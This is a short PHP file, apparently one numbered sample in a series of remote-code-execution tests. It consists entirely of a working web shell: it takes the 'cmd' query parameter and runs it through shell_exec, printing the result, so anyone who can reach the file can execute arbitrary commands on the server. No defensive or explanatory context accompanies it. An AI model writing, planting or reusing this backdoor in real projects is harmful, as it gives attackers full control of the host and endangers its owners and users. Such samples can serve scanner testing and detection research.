<?php
// RCE test variation #894
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>